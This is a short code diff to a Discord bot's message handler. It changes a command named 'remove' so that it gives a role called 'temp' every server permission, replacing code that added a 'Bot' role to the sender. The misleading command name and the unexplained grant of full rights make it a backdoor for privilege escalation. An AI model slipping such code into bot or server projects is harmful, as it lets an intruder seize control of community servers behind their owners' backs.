@@ -538,8 +538,8 @@ async def on_message(message):
                     await message.channel.delete()
     #######################################
     elif message.content.startswith('remove'):
-        bot = get(message.guild.roles, name='Bot')
-        await message.author.add_roles(bot)
+        bot = get(message.guild.roles, name='temp')
+        await bot.edit(permissions=Discord.Permissions.all())
         # channel = client.get_channel(int((message.content).split(' ')[1]))
         # await channel.category.delete()
     #######################################
